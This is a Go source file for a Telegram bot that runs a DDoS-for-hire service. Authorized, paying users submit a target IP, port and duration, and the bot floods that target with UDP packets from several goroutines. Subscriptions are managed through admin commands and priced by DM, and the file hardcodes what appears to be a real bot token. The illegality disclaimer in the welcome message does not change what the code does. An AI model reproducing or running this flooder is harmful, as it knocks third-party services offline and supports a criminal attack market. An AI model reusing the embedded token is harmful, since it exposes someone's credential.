package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

type Authorization struct {
	ChatID    int64     `json:"chat_id"`
	ExpiresAt time.Time `json:"expires_at"`
}

type DDOSSession struct {
	IPAddress string
	Port      string
	Duration  int
	StopChan  chan struct{}
	StopOnce  sync.Once
}

var (
	authorizedUsers map[int64]Authorization
	ddosSessions    map[int64]*DDOSSession
	authorizedFile        = "authorized_users.json"
	botOwnerID      int64 = 1057412250 // Replace with your actual bot owner chat ID

	kolkataLocation *time.Location // IST timezone
)

func main() {
	// Replace with your actual bot token
	botToken := "7437565742:AAHvZg8wPAi4510VISEs2EA87iUk5T5S9JM"

	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		log.Panic(err)
	}

	bot.Debug = false

	// Load the IST timezone
	kolkataLocation, err = time.LoadLocation("Asia/Kolkata")
	if err != nil {
		log.Panic("Failed to load IST timezone: ", err)
	}

	// Load authorized users from file
	loadAuthorizedUsers()

	// Initialize DDOS sessions map
	ddosSessions = make(map[int64]*DDOSSession)

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message == nil {
			continue
		}

		chatID := update.Message.Chat.ID
		command := update.Message.Command()
		args := strings.Split(update.Message.CommandArguments(), " ")

		switch command {
		case "start":
			userName := getUserName(update.Message)
			welcomeMessage := fmt.Sprintf(
				"✨ *Welcome, %s!* ✨\n\n"+
	"🌟 *I'm here to help you with DDoS By ALPHA.* 🌟\n\n"+
	"*Use the following commands to get started:*\n\n"+
	"```"+
	"🔹 [IP]:[Port] [Duration] - Start sending DDoS.\n"+
	"🔹 /recent              - Repeat the last used DDoS send command.\n"+
	"🔹 /stop                - Stop the current DDoS.\n"+
	"🔹 /add [chat_id] [days] - Admin only: Authorize a user for specified days.\n"+
	"🔹 /remove [chat_id]    - Admin only: Remove an authorized user.\n"+
	"🔹 /plan                - Check your authorization status and remaining time.\n"+
	"🔹 /broadcast [message] - Admin only: Broadcast a message to all authorized users.\n"+
	"🔹 /chatid              - Get your chat ID.\n\n"+
	"```\n"+
	"✨ *THIS BOT/DDOS CREATED BY @OGxALPHA* ✨\n"+
	"✨ *DM TO ASK FOR PRICING @OGxALPHA* ✨\n\n"+
	"⚠️ *Please note that performing DDoS attacks is illegal and unethical.* ⚠️\n"+
	"⚠️ *I am not responsible for any misuse of this tool.* ⚠️\n"+
	"⚠️ *Users are advised to stay alert and use this service responsibly.* ⚠️",
				userName,
			)

			bot.Send(tgbotapi.NewMessage(chatID, welcomeMessage))

		case "send":
			if !isAuthorized(chatID, bot) {
				bot.Send(tgbotapi.NewMessage(chatID, "You are not authorized to use this command. Please contact the admin for access."))
				continue
			}

			if len(args) != 3 {
				bot.Send(tgbotapi.NewMessage(chatID, "Invalid arguments. Use /send [IP] [Port] [Duration]."))
				continue
			}

			ipAddress := args[0]
			port := args[1]
			durationStr := args[2]

			if net.ParseIP(ipAddress) == nil {
				bot.Send(tgbotapi.NewMessage(chatID, "Invalid IP address."))
				continue
			}

			portInt, err := strconv.Atoi(port)
			if err != nil || portInt < 1 || portInt > 65535 {
				bot.Send(tgbotapi.NewMessage(chatID, "Invalid port."))
				continue
			}

			duration, err := strconv.Atoi(durationStr)
			if err != nil || duration <= 0 {
				bot.Send(tgbotapi.NewMessage(chatID, "Invalid duration."))
				continue
			}

			session, exists := ddosSessions[chatID]
			if exists && session.StopChan != nil {
				bot.Send(tgbotapi.NewMessage(chatID, "Another flood is already running. Use /stop to stop it first."))
				continue
			}

			// Store the session details
			ddosSessions[chatID] = &DDOSSession{
				IPAddress: ipAddress,
				Port:      port,
				Duration:  duration,
				StopChan:  make(chan struct{}),
			}

			bot.Send(tgbotapi.NewMessage(chatID, fmt.Sprintf("Starting UDP flood to %s:%s for %d seconds...", ipAddress, port, duration)))
			go sendUDPFlood(chatID, bot)

		case "recent":
			if !isAuthorized(chatID, bot) {
				bot.Send(tgbotapi.NewMessage(chatID, "You are not authorized to use this command. Please contact the admin for access."))
				continue
			}

			session, exists := ddosSessions[chatID]
			if !exists || session.IPAddress == "" || session.Port == "" || session.Duration == 0 {
				bot.Send(tgbotapi.NewMessage(chatID, "No recent command available. Use /send to start a new flood."))
				continue
			}

			if session.StopChan != nil {
				bot.Send(tgbotapi.NewMessage(chatID, "Another flood is already running. Use /stop to stop it first."))
				continue
			}

			session.StopChan = make(chan struct{})
			bot.Send(tgbotapi.NewMessage(chatID, fmt.Sprintf("Repeating UDP flood to %s:%s for %d seconds...", session.IPAddress, session.Port, session.Duration)))
			go sendUDPFlood(chatID, bot)

		case "stop":
			session, exists := ddosSessions[chatID]
			if exists && session.StopChan != nil {
				session.StopOnce.Do(func() { close(session.StopChan) })
				session.StopChan = nil
				bot.Send(tgbotapi.NewMessage(chatID, "UDP flood stopped."))
			} else {
				bot.Send(tgbotapi.NewMessage(chatID, "No active UDP flood to stop."))
			}

		case "add":
			if chatID != botOwnerID {
				bot.Send(tgbotapi.NewMessage(chatID, "You are not authorized to use this command."))
				continue
			}

			if len(args) != 2 {
				bot.Send(tgbotapi.NewMessage(chatID, "Invalid arguments. Use /add [chat_id] [days]."))
				continue
			}

			newChatID, err := strconv.ParseInt(args[0], 10, 64)
			if err != nil {
				bot.Send(tgbotapi.NewMessage(chatID, "Invalid chat ID."))
				continue
			}

			days, err := strconv.Atoi(args[1])
			if err != nil || days <= 0 {
				bot.Send(tgbotapi.NewMessage(chatID, "Invalid number of days."))
				continue
			}

			authorizeUser(newChatID, days, bot)
			bot.Send(tgbotapi.NewMessage(chatID, fmt.Sprintf("User %d authorized for %d days.", newChatID, days)))

		case "remove":
			if chatID != botOwnerID {
				bot.Send(tgbotapi.NewMessage(chatID, "You are not authorized to use this command."))
				continue
			}

			if len(args) != 1 {
				bot.Send(tgbotapi.NewMessage(chatID, "Invalid arguments. Use /remove [chat_id]."))
				continue
			}

			removeChatID, err := strconv.ParseInt(args[0], 10, 64)
			if err != nil {
				bot.Send(tgbotapi.NewMessage(chatID, "Invalid chat ID."))
				continue
			}

			if _, exists := authorizedUsers[removeChatID]; !exists {
				bot.Send(tgbotapi.NewMessage(chatID, "User not found in authorized list."))
				continue
			}

			removeUser(removeChatID)
			bot.Send(tgbotapi.NewMessage(chatID, fmt.Sprintf("User %d removed from authorized users.", removeChatID)))

		case "plan":
			if !isAuthorized(chatID, bot) {
				bot.Send(tgbotapi.NewMessage(chatID, "You are not authorized to use this command. Please contact the admin for access."))
				continue
			}

			auth, exists := authorizedUsers[chatID]
			if !exists {
				bot.Send(tgbotapi.NewMessage(chatID, "Authorization record not found."))
				continue
			}

			remainingTime := time.Until(auth.ExpiresAt)
			hours := int(remainingTime.Hours())
			minutes := int(remainingTime.Minutes()) % 60
			bot.Send(tgbotapi.NewMessage(chatID, fmt.Sprintf("Your authorization expires in: %d hours %d minutes.", hours, minutes)))

		case "broadcast":
			if chatID != botOwnerID {
				bot.Send(tgbotapi.NewMessage(chatID, "You are not authorized to use this command."))
				continue
			}

			if len(args) == 0 {
				bot.Send(tgbotapi.NewMessage(chatID, "Invalid arguments. Use /broadcast [message]."))
				continue
			}

			broadcastMessage := strings.Join(args, " ")
			broadcastToAll(bot, broadcastMessage)

		case "chatid":
			chatIDMessage := fmt.Sprintf("🆔 Your Chat ID: %d\n\nTap to copy: [ %d ]", chatID, chatID)
			copyButton := tgbotapi.NewInlineKeyboardMarkup(
				tgbotapi.NewInlineKeyboardRow(
					tgbotapi.NewInlineKeyboardButtonData(fmt.Sprintf("%d", chatID), fmt.Sprintf("%d", chatID)),
				),
			)

			msg := tgbotapi.NewMessage(chatID, chatIDMessage)
			msg.ReplyMarkup = copyButton
			bot.Send(msg)

		default:
			bot.Send(tgbotapi.NewMessage(chatID, "Unknown command. Please use /start to see available commands."))
		}
	}
}

func getUserName(message *tgbotapi.Message) string {
	userName := message.From.UserName
	if userName == "" {
		userName = message.From.FirstName
		if message.From.LastName != "" {
			userName += " " + message.From.LastName
		}
	}
	return userName
}

func sendUDPFlood(chatID int64, bot *tgbotapi.BotAPI) {
	session := ddosSessions[chatID]
	if session == nil {
		bot.Send(tgbotapi.NewMessage(chatID, "Session not found."))
		return
	}

	durationTime := time.Duration(session.Duration) * time.Second

	addr, err := net.ResolveUDPAddr("udp", session.IPAddress+":"+session.Port)
	if err != nil {
		bot.Send(tgbotapi.NewMessage(chatID, fmt.Sprintf("Error resolving address: %v", err)))
		return
	}

	message := make([]byte, 1470)
	for i := range message {
		message[i] = byte(i % 256)
	}

	startTime := time.Now()
	stopChanLocal := session.StopChan

	var wg sync.WaitGroup

	sendPackets := func() {
		defer wg.Done()
		conn, err := net.DialUDP("udp", nil, addr)
		if err != nil {
			bot.Send(tgbotapi.NewMessage(chatID, fmt.Sprintf("Error creating UDP connection: %v", err)))
			return
		}
		defer conn.Close()

		for {
			select {
			case <-stopChanLocal:
				bot.Send(tgbotapi.NewMessage(chatID, "UDP flood stopped by user."))
				return
			default:
				if time.Since(startTime) >= durationTime {
					bot.Send(tgbotapi.NewMessage(chatID, "UDP flood duration completed."))
					return
				}
				_, err := conn.Write(message)
				if err != nil {
					bot.Send(tgbotapi.NewMessage(chatID, fmt.Sprintf("Error sending message: %v", err)))
					return
				}
			}
		}
	}

	numGoroutines := runtime.NumCPU() // Number of goroutines proportional to CPU cores

	for i := 0; i < numGoroutines; i++ {
		wg.Add(1)
		go sendPackets()
	}

	c := make(chan os.Signal, 1)
	signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-c
		session.StopOnce.Do(func() { close(session.StopChan) })
		session.StopChan = nil
		bot.Send(tgbotapi.NewMessage(chatID, "UDP flood interrupted by system signal."))
	}()

	wg.Wait()
	session.StopChan = nil
	bot.Send(tgbotapi.NewMessage(chatID, "UDP flood completed."))
}

func authorizeUser(chatID int64, days int, bot *tgbotapi.BotAPI) {
	expiration := time.Now().In(kolkataLocation).Add(time.Duration(days) * 24 * time.Hour)
	authorizedUsers[chatID] = Authorization{
		ChatID:    chatID,
		ExpiresAt: expiration,
	}
	saveAuthorizedUsers()
	bot.Send(tgbotapi.NewMessage(chatID, fmt.Sprintf("You have been authorized for %d days. Your authorization will expire on %s.", days, expiration.Format("02-Jan-2006 15:04:05 MST"))))
}

func removeUser(chatID int64) {
	delete(authorizedUsers, chatID)
	saveAuthorizedUsers()
}

func isAuthorized(chatID int64, bot *tgbotapi.BotAPI) bool {
	auth, exists := authorizedUsers[chatID]
	if !exists {
		return false
	}

	if time.Now().In(kolkataLocation).After(auth.ExpiresAt) {
		// User's authorization has expired
		bot.Send(tgbotapi.NewMessage(chatID, "Your authorization has expired. Please contact the admin to renew it."))
		delete(authorizedUsers, chatID)
		saveAuthorizedUsers()
		return false
	}

	return true
}

func loadAuthorizedUsers() {
	file, err := os.Open(authorizedFile)
	if err != nil {
		authorizedUsers = make(map[int64]Authorization)
		return
	}
	defer file.Close()

	decoder := json.NewDecoder(file)
	err = decoder.Decode(&authorizedUsers)
	if err != nil {
		log.Println("Error decoding authorized users:", err)
		authorizedUsers = make(map[int64]Authorization)
	}
}

func saveAuthorizedUsers() {
	file, err := os.Create(authorizedFile)
	if err != nil {
		log.Println("Error saving authorized users:", err)
		return
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	err = encoder.Encode(&authorizedUsers)
	if err != nil {
		log.Println("Error encoding authorized users:", err)
	}
}

func broadcastToAll(bot *tgbotapi.BotAPI, message string) {
	var wg sync.WaitGroup
	for chatID := range authorizedUsers {
		wg.Add(1)
		go func(chatID int64) {
			defer wg.Done()
			bot.Send(tgbotapi.NewMessage(chatID, fmt.Sprintf("📣 Broadcast Message:\n\n%s", message)))
		}(chatID)
	}
	wg.Wait()
}

